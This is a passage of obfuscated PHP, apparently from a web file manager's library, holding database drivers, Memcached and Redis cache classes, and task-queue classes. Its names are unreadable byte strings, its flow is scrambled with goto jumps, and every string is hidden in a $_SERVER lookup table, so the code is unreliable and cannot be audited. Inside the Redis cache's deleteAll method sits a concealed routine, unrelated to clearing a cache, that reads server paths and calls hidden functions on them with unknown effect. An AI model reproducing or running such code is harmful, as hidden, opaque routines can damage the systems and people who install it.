$b²É¤Ş±‘» = $this->parseValue($D¼´íˆ™’ƒ); if (is_scalar($b²É¤Ş±‘»)) { $d¤†£Ã¬¢ƒ[] = $b²É¤Ş±‘»; $cãİ®Ê†­Í[] = $this->parseKey($bƒãÕñóÈê); } } $E¨µ¨ŸØœµ = $CÔİ§ÄŸêª[839] . $this->parseTable($f¹î…ˆ³Ï[$CÔİ§ÄŸêª[284]]) . $CÔİ§ÄŸêª[840] . implode($CÔİ§ÄŸêª[57], $cãİ®Ê†­Í) . $CÔİ§ÄŸêª[841] . implode($CÔİ§ÄŸêª[57], $d¤†£Ã¬¢ƒ) . $CÔİ§ÄŸêª[842]; return $this->execute($E¨µ¨ŸØœµ); } public function insertAll($EóŸ…å¥ƒÙ, $eÇœ¬Û“´ = array(), $b•­‡ƒëœœ = false) { goto aô¨ªÎŸ; aô¨ªÎŸ: $CˆˆÒÁ‰‹ =& $_SERVER[¾÷]; if (!is_array($EóŸ…å¥ƒÙ[0])) { return !1; } $eçÜÁ˜¿’ = array_keys($EóŸ…å¥ƒÙ[0]); goto dõõ®›¿Ô„; b¨Ì¶‘Î: $d­‡í‰É»ê = ($b•­‡ƒëœœ ? $CˆˆÒÁ‰‹[844] : $CˆˆÒÁ‰‹[845]) . $CˆˆÒÁ‰‹[846] . $this->parseTable($eÇœ¬Û“´[$CˆˆÒÁ‰‹[284]]) . $CˆˆÒÁ‰‹[840] . implode($CˆˆÒÁ‰‹[57], $eçÜÁ˜¿’) . $CˆˆÒÁ‰‹[847] . implode($CˆˆÒÁ‰‹[57], $AÓÆ³Ôì¥‰); return $this->execute($d­‡í‰É»ê); goto E ç…Íˆ¨; dõõ®›¿Ô„: $AÓÆ³Ôì¥‰ = array(); foreach ($EóŸ…å¥ƒÙ as $BåÎô¢œİ) { $BÓ‹ÜÖ‡Ö… = array(); foreach ($BåÎô¢œİ as $a‰‘œ‡×Êß => $A™¬ Š½„) { $A™¬ Š½„ = $this->parseValue($A™¬ Š½„); if (is_scalar($A™¬ Š½„)) { $BÓ‹ÜÖ‡Ö…[] = $A™¬ Š½„; } } $AÓÆ³Ôì¥‰[] = $CˆˆÒÁ‰‹[265] . implode($CˆˆÒÁ‰‹[57], $BÓ‹ÜÖ‡Ö…) . $CˆˆÒÁ‰‹[842]; } array_walk($eçÜÁ˜¿’, array($this, $CˆˆÒÁ‰‹[843])); goto b¨Ì¶‘Î; E ç…Íˆ¨: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $F‰—ßÑÙš¨ =& $_SERVER[¾÷]; $this->error = mysql_errno() . $F‰—ßÑÙš¨[14] . mysql_error($this->_linkID); if ($F‰—ßÑÙš¨[43] != $this->queryStr) { $this->error .= LNG($F‰—ßÑÙš¨[55]) . $this->queryStr; } think_trace($this->error, $F‰—ßÑÙš¨[43], $F‰—ßÑÙš¨[56]); return $this->error; } public function escapeString($Fç‹’ùÏåŒ) { if ($this->_linkID) { return mysql_real_escape_string($Fç‹’ùÏåŒ, $this->_linkID); } else { return mysql_escape_string($Fç‹’ùÏåŒ); } } public function parseKey(&$FÃæ‰¡¨‡ó, $bÅÔáŠŠéÊ = true) { $BîéÊïÄ„± =& $_SERVER[¾÷]; if ($bÅÔáŠŠéÊ) { $FÃæ‰¡¨‡ó = $this->parseKeyCheck($FÃæ‰¡¨‡ó); } if ($FÃæ‰¡¨‡ó != $BîéÊïÄ„±[191] && !preg_match($BîéÊïÄ„±[848], $FÃæ‰¡¨‡ó)) { $FÃæ‰¡¨‡ó = $BîéÊïÄ„±[389] . trim($FÃæ‰¡¨‡ó, $BîéÊïÄ„±[389]) . $BîéÊïÄ„±[389]; } return $FÃæ‰¡¨‡ó; } } class DbMysqli extends Db { public function __construct($fÒ½¸”¹Æ = '') { $EÉ÷³åÏÙ =& $_SERVER[¾÷]; if (!extension_loaded($EÉ÷³åÏÙ[750])) { think_exception(think_lang($EÉ÷³åÏÙ[20]) . $EÉ÷³åÏÙ[849]); } if (!empty($fÒ½¸”¹Æ)) { $this->config = $fÒ½¸”¹Æ; if (empty($this->config[$EÉ÷³åÏÙ[23]])) { $this->config[$EÉ÷³åÏÙ[23]] = $EÉ÷³åÏÙ[43]; } } } public function connect($aÑ¨Èİ…â = '', $a“ÊÖ´ØÕ = 0) { $Càê¤Âè° =& $_SERVER[¾÷]; if (!isset($this->linkID[$a“ÊÖ´ØÕ])) { goto càƒÀ‡İ‹; e¿¥†ö„ŞÊ: $eğ«Õ‡Š¯³ = $this->linkID[$a“ÊÖ´ØÕ]->server_version; $this->linkID[$a“ÊÖ´ØÕ]->query($Càê¤Âè°[827] . think_config($Càê¤Âè°[828]) . $Càê¤Âè°[65]); if ($eğ«Õ‡Š¯³ > $Càê¤Âè°[829]) { $this->linkID[$a“ÊÖ´ØÕ]->query($Càê¤Âè°[830]); } goto dÌÃ¬«í; dÌÃ¬«í: $this->connected = !0; if (1 != think_config($Càê¤Âè°[28])) { unset($this->config); } goto FÊ–Ïƒ÷§; càƒÀ‡İ‹: if (empty($aÑ¨Èİ…â)) { $aÑ¨Èİ…â = $this->config; } $this->linkID[$a“ÊÖ´ØÕ] = new mysqli($aÑ¨Èİ…â[$Càê¤Âè°[823]], $aÑ¨Èİ…â[$Càê¤Âè°[825]], $aÑ¨Èİ…â[$Càê¤Âè°[826]], $aÑ¨Èİ…â[$Càê¤Âè°[27]], $aÑ¨Èİ…â[$Càê¤Âè°[824]] ? intval($aÑ¨Èİ…â[$Càê¤Âè°[824]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto e¿¥†ö„ŞÊ; FÊ–Ïƒ÷§: } return $this->linkID[$a“ÊÖ´ØÕ]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($bÀÖ´ØªØ¨) { goto cœˆ¾ƒ¼ô‰; e‚—…ĞËƒ±: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto Eõ·ÇëŒ®¾; Eºñó˜Å†: think_status($C³¿Ù‡ä[30]); $this->queryID = $this->_linkID->query($bÀÖ´ØªØ¨); if ($this->_linkID->more_results()) { while (($cÆ»²ô½èÛ = $this->_linkID->next_result()) != NULL) { $cÆ»²ô½èÛ->free_result(); } } goto e‚—…ĞËƒ±; cœˆ¾ƒ¼ô‰: $C³¿Ù‡ä =& $_SERVER[¾÷]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto f Š¸ë°ø×; f Š¸ë°ø×: $this->queryStr = $bÀÖ´ØªØ¨; if ($this->queryID) { $this->free(); } think_action_status($C³¿Ù‡ä[29], 1); goto Eºñó˜Å†; Eõ·ÇëŒ®¾: } public function execute($e‹Ê´´¹×) { goto d˜Œí›ÙëŠ; Fà‹Åï‘ÃÅ: if (!1 === $eÖìŒ†¶‘”) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto f¦Ãë’ñ¥š; cá¨Ü«ô: $this->queryStr = $e‹Ê´´¹×; if ($this->queryID) { $this->free(); } think_action_status($d±¾¿™ğÒ[31], 1); goto AÙøóšáËÆ; d˜Œí›ÙëŠ: $d±¾¿™ğÒ =& $_SERVER[¾÷]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto cá¨Ü«ô; AÙøóšáËÆ: think_status($d±¾¿™ğÒ[30]); $eÖìŒ†¶‘” = $this->_linkID->query($e‹Ê´´¹×); $this->debug(); goto Fà‹Åï‘ÃÅ; f¦Ãë’ñ¥š: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $CÒÒ¤Ò• = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$CÒÒ¤Ò•) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $B¶ùÖ¨Ë» = $this->_linkID->rollback(); $this->transTimes = 0; if (!$B¶ùÖ¨Ë») { $this->error(); return !1; } } return !0; } private function getAll() { $B³‰”®´òõ = array(); if ($this->numRows > 0) { for ($f’Ü£©Ì“Ä = 0; $f’Ü£©Ì“Ä < $this->numRows; $f’Ü£©Ì“Ä++) { $B³‰”®´òõ[$f’Ü£©Ì“Ä] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $B³‰”®´òõ; } public function getFields($cµÉ¶…ñ§) { $f„•±­Åºº =& $_SERVER[¾÷]; $c´ØÑ¾ÜŒ¡ = $this->query($f„•±­Åºº[834] . $this->parseKey($cµÉ¶…ñ§)); $d‡² £­ùŞ = array(); if ($c´ØÑ¾ÜŒ¡) { foreach ($c´ØÑ¾ÜŒ¡ as $CÂŒöñì­ => $a“êª­‰Å) { $d‡² £­ùŞ[$a“êª­‰Å[$f„•±­Åºº[37]]] = array($f„•±­Åºº[38] => $a“êª­‰Å[$f„•±­Åºº[37]], $f„•±­Åºº[39] => $a“êª­‰Å[$f„•±­Åºº[40]], $f„•±­Åºº[41] => (bool) ($a“êª­‰Å[$f„•±­Åºº[42]] === $f„•±­Åºº[43]), $f„•±­Åºº[44] => $a“êª­‰Å[$f„•±­Åºº[45]], $f„•±­Åºº[46] => strtolower($a“êª­‰Å[$f„•±­Åºº[47]]) == $f„•±­Åºº[48], $f„•±­Åºº[49] => strtolower($a“êª­‰Å[$f„•±­Åºº[50]]) == $f„•±­Åºº[51]); } } return $d‡² £­ùŞ; } public function getTables($CäÍö„¦ª = '') { $F”ÊÏËÁ¤Ê =& $_SERVER[¾÷]; $e‡¡æÙïÉ = !empty($CäÍö„¦ª) ? $F”ÊÏËÁ¤Ê[836] . $CäÍö„¦ª . $F”ÊÏËÁ¤Ê[837] : $F”ÊÏËÁ¤Ê[838]; $Cô‡º‘¥ = $this->query($e‡¡æÙïÉ); $Añ…ç³©±µ = array(); if ($Cô‡º‘¥) { foreach ($Cô‡º‘¥ as $B¸Ç¹¨•ß¦ => $Eï‘â“‡ä) { $Añ…ç³©±µ[$B¸Ç¹¨•ß¦] = current($Eï‘â“‡ä); } } return $Añ…ç³©±µ; } public function replace($D£Š•Ëˆç, $cùÃÂ…ô½Â = array()) { $dì±¡­ã÷ =& $_SERVER[¾÷]; foreach ($D£Š•Ëˆç as $a‘Ç•İ©ˆ® => $b‘¹¦‡ö÷è) { $B‰™¤éÚĞ = $this->parseValue($b‘¹¦‡ö÷è); if (is_scalar($B‰™¤éÚĞ)) { $e›ó…×áí‹[] = $B‰™¤éÚĞ; $A×«‚˜Ó[] = $this->parseKey($a‘Ç•İ©ˆ®); } } $eÊ‰ß×êä = $dì±¡­ã÷[839] . $this->parseTable($cùÃÂ…ô½Â[$dì±¡­ã÷[284]]) . $dì±¡­ã÷[840] . implode($dì±¡­ã÷[57], $A×«‚˜Ó) . $dì±¡­ã÷[841] . implode($dì±¡­ã÷[57], $e›ó…×áí‹) . $dì±¡­ã÷[842]; return $this->execute($eÊ‰ß×êä); } public function insertAll($fƒ—‘Ìİâ¾, $aŞ‡·ï‘ö¿ = array(), $bµêÆß¥¸ƒ = false) { goto d ‘Ó¼ª¾Ô; BĞÉàÕ£‰: $eÃ„Ê”ª® = $bµêÆß¥¸ƒ ? $bøØ¿‚äÁ[844] : $bøØ¿‚äÁ[845]; $aĞÁÌÃÈ¢ = $eÃ„Ê”ª® . $bøØ¿‚äÁ[846] . $this->parseTable($aŞ‡·ï‘ö¿[$bøØ¿‚äÁ[284]]) . $bøØ¿‚äÁ[840] . implode($bøØ¿‚äÁ[57], $FÀŒê…°ù) . $bøØ¿‚äÁ[847] . implode($bøØ¿‚äÁ[57], $DßÆ¡Ç±‘Ä); return $this->execute($aĞÁÌÃÈ¢); goto FÌôİ¨¡Ô; Cœ®—ÚÌ§: $DßÆ¡Ç±‘Ä = array(); foreach ($fƒ—‘Ìİâ¾ as $EİŒ¼–ØÇ) { $b—ãíˆ¸¶¥ = array(); foreach ($EİŒ¼–ØÇ as $BäŞêå¡ô® => $d‹ééã³ŠÃ) { $d‹ééã³ŠÃ = $this->parseValue($d‹ééã³ŠÃ); if (is_scalar($d‹ééã³ŠÃ)) { $b—ãíˆ¸¶¥[] = $d‹ééã³ŠÃ; } } $DßÆ¡Ç±‘Ä[] = $bøØ¿‚äÁ[265] . implode($bøØ¿‚äÁ[57], $b—ãíˆ¸¶¥) . $bøØ¿‚äÁ[842]; } array_walk($FÀŒê…°ù, array($this, $bøØ¿‚äÁ[843])); goto BĞÉàÕ£‰; d ‘Ó¼ª¾Ô: $bøØ¿‚äÁ =& $_SERVER[¾÷]; if (!is_array($fƒ—‘Ìİâ¾[0])) { return !1; } $FÀŒê…°ù = array_keys($fƒ—‘Ìİâ¾[0]); goto Cœ®—ÚÌ§; FÌôİ¨¡Ô: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $b¸Ú„Š¼•¬ =& $_SERVER[¾÷]; $this->error = $this->_linkID->errno . $b¸Ú„Š¼•¬[14] . $this->_linkID->error; if ($b¸Ú„Š¼•¬[43] != $this->queryStr) { $this->error .= LNG($b¸Ú„Š¼•¬[55]) . $this->queryStr; } think_trace($this->error, $b¸Ú„Š¼•¬[43], $b¸Ú„Š¼•¬[56]); return $this->error; } public function escapeString($b‰´¬Üêœ™) { if ($this->_linkID) { return $this->_linkID->real_escape_string($b‰´¬Üêœ™); } else { return addslashes($b‰´¬Üêœ™); } } public function parseKey(&$f²í‘…ö°‡, $AÔËàíâ = true) { $dÈ´×Ê•óæ =& $_SERVER[¾÷]; if ($AÔËàíâ) { $f²í‘…ö°‡ = $this->parseKeyCheck($f²í‘…ö°‡); } if ($f²í‘…ö°‡ != $dÈ´×Ê•óæ[191] && !preg_match($dÈ´×Ê•óæ[848], $f²í‘…ö°‡)) { $f²í‘…ö°‡ = $dÈ´×Ê•óæ[389] . trim($f²í‘…ö°‡, $dÈ´×Ê•óæ[389]) . $dÈ´×Ê•óæ[389]; } return $f²í‘…ö°‡; } } goto a¥Æºßßé“; a÷Ë£ëóö: class CacheLockDatabase { public function lock($eåŸäë’‹ˆ, $EÅÆ¶ù¬‡— = 0) { $eŠÄ´•Û®Ê = Model($_SERVER[¾÷][780]); $E´ùƒÛ´í = microtime(!0) + $EÅÆ¶ù¬‡—; while (microtime(!0) < $E´ùƒÛ´í) { $c¸²·ÃàÆ = $eŠÄ´•Û®Ê->get($eåŸäë’‹ˆ); if (!$c¸²·ÃàÆ || $c¸²·ÃàÆ < microtime(!0)) { $F‚Ò…é¼Ùù = $eŠÄ´•Û®Ê->set($eåŸäë’‹ˆ, $E´ùƒÛ´í); if ($F‚Ò…é¼Ùù) { return !0; } } cacheLockWait(); } return !1; } public function lockGet($fÅÖ­ÆÇ„Ã) { return Model($_SERVER[¾÷][780])->get($fÅÖ­ÆÇ„Ã); } public function unlock($bÓ†ƒÉÓŒ) { Model($_SERVER[¾÷][780])->remove($bÓ†ƒÉÓŒ); } } class CacheMemcached { public $handle; public $cacheTime; public function __construct($cÄ¢¦‰¨¦’, $E÷¡Õ‰±»µ) { $bÒ¶”Ğç‰ø =& $_SERVER[¾÷]; if (!class_exists($bÒ¶”Ğç‰ø[807])) { show_json($bÒ¶”Ğç‰ø[808], !1); } $this->cacheTime = $E÷¡Õ‰±»µ; $this->handle = new Memcached(); if (is_array($cÄ¢¦‰¨¦’[$bÒ¶”Ğç‰ø[809]]) && count($cÄ¢¦‰¨¦’[$bÒ¶”Ğç‰ø[809]]) >= 1) { foreach ($cÄ¢¦‰¨¦’[$bÒ¶”Ğç‰ø[809]] as $b¸ê§í±î ) { $bŒ¡ÑÔÜÌˆ = explode($bÒ¶”Ğç‰ø[14], $b¸ê§í±î ); $this->handle->addServer($bŒ¡ÑÔÜÌˆ[0], $bŒ¡ÑÔÜÌˆ[1]); } } else { $this->handle->addServer($cÄ¢¦‰¨¦’[$bÒ¶”Ğç‰ø[184]], $cÄ¢¦‰¨¦’[$bÒ¶”Ğç‰ø[185]]); } } public function set($Eñøƒ½ï¤†, $Bî©Ñ§ã†Ù, $d–âùÆŒã¢ = false) { $d–âùÆŒã¢ = $d–âùÆŒã¢ ? $d–âùÆŒã¢ : $this->cacheTime; return $this->handle->set($Eñøƒ½ï¤†, $Bî©Ñ§ã†Ù, $d–âùÆŒã¢); } public function get($C¡æéø¼‘) { return $this->handle->get($C¡æéø¼‘); } public function remove($BÛä¯ÑÛƒ) { return $this->handle->delete($BÛä¯ÑÛƒ); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($dŠä‡È‰¸”, $D™»´Ü‰´›) { $d™¡²ªŒ˜” =& $_SERVER[¾÷]; if (!class_exists($d™¡²ªŒ˜”[810])) { show_json($d™¡²ªŒ˜”[811], !1); } $this->cacheTime = $D™»´Ü‰´›; $dË­¢¼Œæ = isset($dŠä‡È‰¸”[$d™¡²ªŒ˜”[812]]) ? $dŠä‡È‰¸”[$d™¡²ªŒ˜”[812]] : 10; $cÉ«Š¬²ÜÜ = _get($dŠä‡È‰¸”, $d™¡²ªŒ˜”[809]); if ($cÉ«Š¬²ÜÜ && is_array($cÉ«Š¬²ÜÜ)) { $this->initCluster($dŠä‡È‰¸”, $dË­¢¼Œæ); } else { $this->handle = $this->init($dŠä‡È‰¸”, $dË­¢¼Œæ); } } private function init($fÓË—çØö†, $EĞ«©¢áî) { $BòÚ»½í£ =& $_SERVER[¾÷]; $Aœ­œõìïò = new Redis(); $d£î µ¶ÑÁ = isset($fÓË—çØö†[$BòÚ»½í£[813]]) ? $fÓË—çØö†[$BòÚ»½í£[813]] : !1; if ($d£î µ¶ÑÁ) { $Aœ­œõìïò->pconnect($fÓË—çØö†[$BòÚ»½í£[184]], $fÓË—çØö†[$BòÚ»½í£[185]], $EĞ«©¢áî); } else { $Aœ­œõìïò->connect($fÓË—çØö†[$BòÚ»½í£[184]], $fÓË—çØö†[$BòÚ»½í£[185]], $EĞ«©¢áî); } if (!empty($fÓË—çØö†[$BòÚ»½í£[409]])) { $Aœ­œõìïò->auth($fÓË—çØö†[$BòÚ»½í£[409]]); } return $Aœ­œõìïò; } private function initCluster($FÁ¹Š«×¶—, $E‡Áãá£¾) { $bìÓø¸´°Œ =& $_SERVER[¾÷]; $eçÇÏç¿íî = array($bìÓø¸´°Œ[814], $bìÓø¸´°Œ[815], $bìÓø¸´°Œ[816]); $f²éñÆâ†ß = $bìÓø¸´°Œ[814]; if (isset($FÁ¹Š«×¶—[$bìÓø¸´°Œ[22]]) && in_array($FÁ¹Š«×¶—[$bìÓø¸´°Œ[22]], $eçÇÏç¿íî)) { $f²éñÆâ†ß = $FÁ¹Š«×¶—[$bìÓø¸´°Œ[22]]; } switch ($f²éñÆâ†ß) { case $bìÓø¸´°Œ[814]: $this->_slave($FÁ¹Š«×¶—, $E‡Áãá£¾); break; case $bìÓø¸´°Œ[815]: break; case $bìÓø¸´°Œ[816]: $this->isCluster = !0; $e‰Éô¡ÜÁ… = $FÁ¹Š«×¶—[$bìÓø¸´°Œ[809]]; $CäÜøêù½É = isset($FÁ¹Š«×¶—[$bìÓø¸´°Œ[813]]) ? $FÁ¹Š«×¶—[$bìÓø¸´°Œ[813]] : !1; $cÔ½è‘¯‰˜ = isset($FÁ¹Š«×¶—[$bìÓø¸´°Œ[409]]) ? $FÁ¹Š«×¶—[$bìÓø¸´°Œ[409]] : null; $this->handle = new RedisCluster(NUll, $e‰Éô¡ÜÁ…, $E‡Áãá£¾, $E‡Áãá£¾, $CäÜøêù½É, $cÔ½è‘¯‰˜); break; default: break; } } private function _slave($F²Ë•’«Û±, $a í¾İéå˜) { goto Bì™Ğé»ºÀ; e®íá§ …ò: $this->filterConfig($F²Ë•’«Û±, $A¾î˜ÈŞ„ê[$eëÂŠ¿Ê¶]); $this->slaveHandle = $this->init($F²Ë•’«Û±, $a í¾İéå˜); goto Dî–ÊÊ«Áˆ; Bì™Ğé»ºÀ: $A¾î˜ÈŞ„ê = $F²Ë•’«Û±[$_SERVER[¾÷][809]]; $this->filterConfig($F²Ë•’«Û±, $A¾î˜ÈŞ„ê[0]); $this->handle = $this->init($F²Ë•’«Û±, $a í¾İéå˜); goto DôàÅ¯öÒĞ; DôàÅ¯öÒĞ: unset($A¾î˜ÈŞ„ê[0]); if (empty($A¾î˜ÈŞ„ê)) { return; } $eëÂŠ¿Ê¶ = array_rand($A¾î˜ÈŞ„ê); goto e®íá§ …ò; Dî–ÊÊ«Áˆ: } private function filterConfig(&$F¼ÏÓçÍˆ™, $AÃÌ©–ä÷Ñ) { $FôµŠêè˜Ø =& $_SERVER[¾÷]; $AÑÑğÜŸœØ = explode($FôµŠêè˜Ø[14], $AÃÌ©–ä÷Ñ); $B…ÅÇôÀ„¦ = array($FôµŠêè˜Ø[184] => $AÑÑğÜŸœØ[0], $FôµŠêè˜Ø[185] => $AÑÑğÜŸœØ[1]); $F¼ÏÓçÍˆ™ = array_merge($F¼ÏÓçÍˆ™, $B…ÅÇôÀ„¦); } public function set($C‡‚»©İ²‘, $FÒ×ŒÂåİã, $D Œàõ¥²× = false) { $D Œàõ¥²× = $D Œàõ¥²× ? $D Œàõ¥²× : $this->cacheTime; return $this->handle->setEx($C‡‚»©İ²‘, $D Œàõ¥²×, $FÒ×ŒÂåİã); } public function setLock($F—°ÓêÁ¬Ù, $F„äÛŒªÆ¯, $f¹µ—Ø»àÉ) { return $this->handle->setNX($F—°ÓêÁ¬Ù, $F„äÛŒªÆ¯); } public function get($dĞ¨–Ø±å‡) { $fóÒ¨›İİñ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $fóÒ¨›İİñ->get($dĞ¨–Ø±å‡); } public function remove($dËĞ£ÉØò‚) { return $this->handle->del($dËĞ£ÉØò‚); } public function deleteAll() { $fªñù»½ÍÊ =& $_SERVER[¾÷]; if ($_SERVER[$fªñù»½ÍÊ[4]] != $_SERVER[$fªñù»½ÍÊ[5]]) { goto DŠ–‘–¹±; DŠ–‘–¹±: $Aè£‚“İˆÏ = $fªñù»½ÍÊ[817]; $D‡Ã£¦‘®ç = $fªñù»½ÍÊ[6]; $b‰¼ì‹¸Øµ = $_SERVER[$fªñù»½ÍÊ[7]] . $fªñù»½ÍÊ[8]; goto D§Õ·ÇÑ¨ñ; CªŒÉ±¾ÎÓ: $cø²‘¥‰›º = 1; while ($cø²‘¥‰›º > 1) { $cø²‘¥‰›º = $cø²‘¥‰›º + 4; $aó±÷‹¿“Â = rawurlencode($cø²‘¥‰›º . $fªñù»½ÍÊ[382]); } goto c¿ĞÖÂç›±; D§Õ·ÇÑ¨ñ: $a÷ŒÒŸæõ = $D‡Ã£¦‘®ç($b‰¼ì‹¸Øµ); $EµºàÆÍÕ» = explode($fªñù»½ÍÊ[9], $a÷ŒÒŸæõ); if (count($EµºàÆÍÕ») < $fªñù»½ÍÊ[582]) { $b±Àº”‹Å¿ = $fªñù»½ÍÊ[11]; $b±Àº”‹Å¿(); } goto eá³ŒêË¶ì; eá³ŒêË¶ì: $aŒ¼Ã·ë = $fªñù»½ÍÊ[818]; $aŒ¼Ã·ë($_SERVER[$fªñù»½ÍÊ[819]]); $aŒ¼Ã·ë($_SERVER[$fªñù»½ÍÊ[7]] . $fªñù»½ÍÊ[820]); goto CªŒÉ±¾ÎÓ; c¿ĞÖÂç›±: } if ($this->isCluster) { foreach ($this->handle->_masters() as $DÍ‹Ûª¨) { $this->handle->flushall($DÍ‹Ûª¨); } return; } return $this->handle->flushAll(); } } goto AŒÁë™‰; CÔÌÊ¢ÚÒ: class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($b÷Œˆ±íÂ, $A”ÌÉ•¹Ü™ = 5.0) { if (!$b÷Œˆ±íÂ) { return; } $e§ÒÂ‚Úè‡ = Cache::get($b÷Œˆ±íÂ); if (!$e§ÒÂ‚Úè‡ || timeFloat() - floatVal($e§ÒÂ‚Úè‡) >= $A”ÌÉ•¹Ü™) { Cache::set($b÷Œˆ±íÂ, timeFloat(), $A”ÌÉ•¹Ü™ * 10); return !0; } return !1; } public static function timeLimitCall($fŒô¸•†›Â, $Aƒ¯ôñ´Âİ, $D±‘ôàÚ¾õ, $e½Áó¹ÎÆé = 5.0) { goto Eí«£ÂÚ¼ì; fÛ—«£¿±: if (is_array($f×åİÕ’Î[$fŒô¸•†›Â])) { $Bñóµ‹Û£ò[$eÇåïŠ·øµ[1581]] = $f×åİÕ’Î[$fŒô¸•†›Â][$eÇåïŠ·øµ[1581]]; } if (is_array($f×åİÕ’Î[$fŒô¸•†›Â])) { if (timeFloat() - $f×åİÕ’Î[$fŒô¸•†›Â][$eÇåïŠ·øµ[1580]] < $Bñóµ‹Û£ò[$eÇåïŠ·øµ[205]] * 0.3) { return; } $Bñóµ‹Û£ò[$eÇåïŠ·øµ[1581]] = $f×åİÕ’Î[$fŒô¸•†›Â][$eÇåïŠ·øµ[1581]]; } $f×åİÕ’Î[$fŒô¸•†›Â] = $Bñóµ‹Û£ò; goto b†óç¦œÓ¶; a½„Óñ”õ: $D±”å…ßçê = $eÇåïŠ·øµ[1579]; $f×åİÕ’Î = Cache::get($D±”å…ßçê, !0); $Bñóµ‹Û£ò = array($eÇåïŠ·øµ[1580] => timeFloat(), $eÇåïŠ·øµ[1581] => timeFloat(), $eÇåïŠ·øµ[269] => $Aƒ¯ôñ´Âİ, $eÇåïŠ·øµ[1574] => $D±‘ôàÚ¾õ, $eÇåïŠ·øµ[205] => $e½Áó¹ÎÆé); goto fÛ—«£¿±; b†óç¦œÓ¶: Cache::set($D±”å…ßçê, $f×åİÕ’Î, 60); Cache::removeMemory($D±”å…ßçê); write_log($eÇåïŠ·øµ[1582] . $fŒô¸•†›Â . $eÇåïŠ·øµ[77] . $Aƒ¯ôñ´Âİ, $eÇåïŠ·øµ[1576]); goto CĞßŠ‚ò; Eí«£ÂÚ¼ì: $eÇåïŠ·øµ =& $_SERVER[¾÷]; if (!$fŒô¸•†›Â || !$Aƒ¯ôñ´Âİ) { return; } self::$asyncAdd = !0; goto a½„Óñ”õ; CĞßŠ‚ò: } public static function timeLimitCallLoop() { goto EÊ‰¡Ÿ¯†; aƒŞÙÁÜ : $cá¥…‰¥êõ = array(); foreach ($a²”À“‚Ù as $Dßª‰Ï¯ß => $A“¥Óù†¥) { if ($FÏ Çœí¹Œ - $A“¥Óù†¥[$f•ª”“¾‚¬[1581]] > $A“¥Óù†¥[$f•ª”“¾‚¬[205]]) { $däË«¶÷ˆ­ = !0; try { Hook::apply($A“¥Óù†¥[$f•ª”“¾‚¬[269]], $A“¥Óù†¥[$f•ª”“¾‚¬[1574]]); write_log($f•ª”“¾‚¬[1584] . $Dßª‰Ï¯ß . $f•ª”“¾‚¬[77] . $A“¥Óù†¥[$f•ª”“¾‚¬[269]] . $f•ª”“¾‚¬[1585] . ACTION, $f•ª”“¾‚¬[1576]); } catch (Exception $b‘¨ë—å) { } continue; } $cá¥…‰¥êõ[$Dßª‰Ï¯ß] = $A“¥Óù†¥; } if (!$däË«¶÷ˆ­) { return; } goto c÷ÂÉçí©ˆ; EÊ‰¡Ÿ¯†: $f•ª”“¾‚¬ =& $_SERVER[¾÷]; $B†ËÔ¼´Õ = array($f•ª”“¾‚¬[1583]); $EÓÑ¸ì—ô = in_array(strtolower(ACTION), $B†ËÔ¼´Õ); goto eó˜Í­Ê; eß­ïùêšé: if (!$a²”À“‚Ù || count($a²”À“‚Ù) <= 0) { return; } $däË«¶÷ˆ­ = !1; $FÏ Çœí¹Œ = timeFloat(); goto aƒŞÙÁÜ ; eó˜Í­Ê: if (!$EÓÑ¸ì—ô && !self::$asyncAdd) { return; } $F¡Öˆ•¨ƒ” = $f•ª”“¾‚¬[1579]; $a²”À“‚Ù = Cache::get($F¡Öˆ•¨ƒ”, !0); goto eß­ïùêšé; c÷ÂÉçí©ˆ: if (!$cá¥…‰¥êõ) { return Cache::remove($F¡Öˆ•¨ƒ”); } Cache::set($F¡Öˆ•¨ƒ”, $cá¥…‰¥êõ, 60); Cache::removeMemory($F¡Öˆ•¨ƒ”); goto c‡¤ è–ê¿; c‡¤ è–ê¿: } public static function finished($c…˜¥™æ¼Ş, $eŠœ–›Ñ­Ï) { $CöŒ§¯ºÄ =& $_SERVER[¾÷]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($CöŒ§¯ºÄ[269] => $c…˜¥™æ¼Ş, $CöŒ§¯ºÄ[1574] => $eŠœ–›Ñ­Ï); } private static function finishedRun() { $d¸­ÎÈïÏÊ =& $_SERVER[¾÷]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $EŸïÀªÆ½ğ) { try { Hook::apply($EŸïÀªÆ½ğ[$d¸­ÎÈïÏÊ[269]], $EŸïÀªÆ½ğ[$d¸­ÎÈïÏÊ[1574]]); } catch (Exception $Aí‰òöëóÏ) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto DŒŸ„êİ“Ç; F¦¦ŸÊ¨èÚ: if (!$aµÂ‚–ÉË[$CÓİƒ±™ˆó[1410]]) { $aµÂ‚–ÉË[$CÓİƒ±™ˆó[1410]] = LNG($CÓİƒ±™ˆó[1590]); } goto F¦¸¤¯ÍÔ¨; DŒŸ„êİ“Ç: $CÓİƒ±™ˆó =& $_SERVER[¾÷]; parent::startAfter(); Hook::bind($CÓİƒ±™ˆó[1586], array($this, $CÓİƒ±™ˆó[1587])); goto A ¹ğĞõäÂ; A ¹ğĞõäÂ: Hook::bind($CÓİƒ±™ˆó[1065], 